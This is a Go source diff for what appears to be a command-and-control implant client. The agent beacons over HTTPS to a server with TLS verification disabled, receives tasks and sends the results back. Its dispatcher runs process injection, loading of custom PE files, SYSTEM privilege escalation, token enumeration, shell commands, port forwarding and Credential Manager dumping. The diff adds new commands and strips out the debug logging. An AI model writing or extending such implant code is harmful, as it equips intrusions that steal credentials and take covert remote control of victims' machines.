@@ -90,24 +90,6 @@ func init() {
 
 func InitializeClient() error {
 	Client = data.NewClient()
-	//Client.ClientCaCertPool = x509.NewCertPool()
-	//Client.WSConn = nil
-	//err := ClientAcquireCertificateFromDisk()
-	//err := ClientAcquireCertificate()
-	/*
-		if err != nil {
-			return err
-		}
-		clientCertificate, err := tls.X509KeyPair([]byte(Client.ClientCertPEM), []byte(Client.ClientKeyPem))
-		if err != nil {
-			return err
-		}
-		ok := Client.ClientCaCertPool.AppendCertsFromPEM([]byte(Client.ClientRootCA))
-		if !ok {
-			return errors.New("could not load ca certificate.")
-		}
-		Client.ClientTLSCertificate = clientCertificate
-	*/
 	return nil
 }
 
@@ -203,12 +185,14 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.SpawnInject(t.File, t.Args[0])
 	case "spawn-inject-pipe":
 		result, cmdError = processinjection.SpawnInjectReadPipe(t.File, t.Args[0])
+	case "load-custom-pe":
+		result, cmdError = processinjection.LoadPE(t.File, t.Args)
 	case "screenshot":
 		result, cmdError = screenshot.Screenshot()
 		screenshotTask = true
-	case "runas-netonly":
+	case "logon-user-netonly":
 		result, cmdError = runbinary.RunAsNetOnly(t.Args)
-	case "runas":
+	case "logon-user":
 		result, cmdError = runbinary.RunAs(t.Args)
 	case "run":
 		result, cmdError = runbinary.RunBinary(t.Args)
@@ -243,8 +227,12 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		//result, cmdError = modules.ChiselClient(t.Args)
 	case "get-system":
 		result, cmdError = getsystem.GetSystem()
+	case "disable-priv":
+		result, cmdError = enableprivilege.DisablePriv(t.Args[0])
 	case "enable-priv":
 		result, cmdError = enableprivilege.EnablePriv(t.Args[0])
+	case "show-priv":
+		result, cmdError = enableprivilege.ShowPrivileges()
 	case "enum-tokens":
 		result, cmdError = enumtokens.EnumTokens()
 	case "port-forward":
@@ -329,13 +317,13 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = basic.ShellCommand(t.Args[0])
 	case "dump-credential-mgr":
 		result, cmdError = dumpcredman.DumpCredman(t.Args[0])
+
 	default:
 		result, cmdError = "", errors.New("Command Not Found.")
 	}
 	if t.Command != "shell" {
 		result += "\n" // makes output a little better
 	}
-	fmt.Println(result)
 	if cmdError != nil {
 		return nil, &data.TaskResult{
 			ClientId:   t.ClientId,
@@ -404,7 +392,6 @@ func ClientDoCheckInHttps(client *data.Client, endpoint string) error {
 		MessageType: "CheckIn",
 		MessageData: client.ToBytes(),
 	}
-	log.Println(string(checkInMessage.ToBytes()))
 	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(checkInMessage.ToBytes()))
 	if err != nil {
 		return err
@@ -420,8 +407,13 @@ func ClientDoCheckInHttps(client *data.Client, endpoint string) error {
 	}
 	defer resp.Body.Close()
 	msg, err := ioutil.ReadAll(resp.Body)
-	log.Println(string(msg))
+	if err != nil {
+		return err
+	}
 	err, messageType := utils.CheckMessage(msg)
+	if err != nil {
+		return err
+	}
 	switch messageType {
 	case "CheckIn":
 		err, uuid, publicKey := ClientHandleCheckInResp(msg)
@@ -433,10 +425,10 @@ func ClientDoCheckInHttps(client *data.Client, endpoint string) error {
 		}
 		Client.RsaPublicKey = publicKey
 		Client.ClientId = uuid
+		return nil
 	default:
 		return errors.New("Invalid checkin response message.")
 	}
-	return nil
 }
 
 func ClientHttpsPollHandler(client *data.Client, endpoint string) ([]data.Task, error) {
@@ -446,7 +438,7 @@ func ClientHttpsPollHandler(client *data.Client, endpoint string) ([]data.Task, 
 	}
 	req.Header.Add("authorization", ServerSecret)
 	req.Header.Add("id", client.ClientId)
-	fmt.Println(client.ClientId)
+	//fmt.Println(client.ClientId)
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 	}
@@ -473,7 +465,7 @@ func ClientHttpsSendResultsHandler(client *data.Client, endpoint string, results
 	if err != nil {
 		return err
 	}
-	fmt.Println(string(jsonResults))
+	//fmt.Println(string(jsonResults))
 	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(jsonResults))
 	if err != nil {
 		return err
@@ -489,8 +481,8 @@ func ClientHttpsSendResultsHandler(client *data.Client, endpoint string, results
 		return err
 	}
 	defer resp.Body.Close()
-	msg, err := ioutil.ReadAll(resp.Body)
-	log.Println(string(msg))
+	//msg, err := ioutil.ReadAll(resp.Body)
+	//log.Println(string(msg))
 	return nil
 }
 
@@ -576,50 +568,3 @@ func ClientReceiveHandler(client *data.Client) {
 	}
 	runtime.UnlockOSThread()
 }
-
-func ClientAcquireCertificateFromDisk() error {
-	Client.ClientCertPEM = clientCert
-	Client.ClientKeyPem = clientKey
-	Client.ClientRootCA = caCert
-	return nil
-}
-
-/*
-func ClientAcquireCertificate() error {
-	client := http.Client{
-		Timeout: time.Minute * 3,
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				InsecureSkipVerify: true,
-			},
-		},
-	}
-	certRequest := &data.CertRequest{
-		SharedSecret: ServerSecret,
-	}
-	certBytes, err := json.Marshal(certRequest)
-	if err != nil {
-		log.Fatal(err)
-	}
-	endpoint := fmt.Sprintf("https://%s:/about/contact", ServerHostName)
-	r, err := client.Post(endpoint, "application/json", bytes.NewBuffer(certBytes))
-	if err != nil {
-		return err
-	}
-	certDataReturned := &data.CertRequest{}
-	err = json.NewDecoder(r.Body).Decode(&certDataReturned)
-	if err != nil {
-		return err
-	}
-	decodedCert, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientCertificate)
-	decodedKey, err := base64.StdEncoding.DecodeString(certDataReturned.B64ClientPrivateKey)
-	decodedCa, err := base64.StdEncoding.DecodeString(certDataReturned.B64RootCaCertificate)
-	if err != nil {
-		return err
-	}
-	Client.ClientCertPEM = string(decodedCert)
-	Client.ClientKeyPem = string(decodedKey)
-	Client.ClientRootCA = string(decodedCa)
-	return nil
-}
-*/
